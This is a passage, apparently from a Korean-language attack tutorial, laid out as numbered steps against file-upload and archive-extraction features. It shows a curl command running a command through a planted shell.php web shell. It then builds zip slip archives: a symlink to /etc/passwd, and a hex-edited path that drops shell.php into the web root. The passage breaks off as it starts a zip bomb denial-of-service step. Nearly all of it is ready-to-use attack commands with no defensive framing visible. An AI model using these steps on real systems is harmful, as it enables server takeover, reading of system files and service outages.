    curl http://target/shell.php?c=id
    ```

    ▶ 2단계: 도구 A — 수동 zip slip
    ```bash
    # zip 명령으로 ../ path 포함 entry 생성 (Linux)
    cd /tmp && mkdir -p slip && cd slip
    ln -s /etc/passwd link  # symlink
    zip --symlinks /tmp/symlink.zip link
    # 또는 path traversal 직접
    echo "shell" > shell.php
    zip /tmp/zipslip.zip shell.php
    # zip 내용을 hex 편집기로 path 변경 (../../../var/www/html/shell.php)
    ```

    ▶ 3단계: 도구 B — Zip Bomb (DoS)
    ```bash
    # 작은 zip → 큰 압축 해제 (원자력 zip 42.zip)
